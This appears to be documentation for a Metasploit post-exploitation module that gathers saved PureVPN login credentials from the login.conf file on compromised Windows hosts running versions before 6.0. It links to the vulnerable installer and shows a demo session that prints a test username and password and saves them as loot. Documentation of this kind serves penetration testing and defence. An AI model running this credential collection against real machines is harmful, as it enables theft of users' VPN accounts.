# Introduction

This module allows you to collect login information for PureVPN client, specifically the `login.conf` file.

## Vulnerable Application

Versions before 6.0 should be vulnerable. For testing purposes, you may find the vulnerable version here:

* [https://jumpshare.com/v/LZcpUqJcThY1v7WlH95m](https://jumpshare.com/v/LZcpUqJcThY1v7WlH95m)
* [https://s3.amazonaws.com/purevpn-dialer-assets/windows/app/purevpn_setup.exe](https://s3.amazonaws.com/purevpn-dialer-assets/windows/app/purevpn_setup.exe)

# Options

**RPATH**

You may manually set the `RPATH` datastore option to allow the post module to find the installed
directory of PureVPN.

# Demo

```
msf5 post(windows/gather/credentials/purevpn_cred_collector) > rerun
[*] Reloading module...

[*] Searching PureVPN Client installation at C:\ProgramData
[*] Found PureVPN Client installation at C:\ProgramData
[*] Checking for login configuration at: C:\ProgramData\purevpn\config\
[*] Configuration file found: C:\ProgramData\purevpn\config\login.conf
[*] Found PureVPN login configuration on DESKTOP-AFMF2QU via session ID: 1
[+] Collected the following credentials:
[+]     Username: asfafsdas
[+]     Password: 23423423
[*] PureVPN credentials saved in: /Users/wchen/.msf4/loot/20181127162258_default_172.16.249.215_PureVPN.creds_515624.txt
[*] Post module execution completed
```
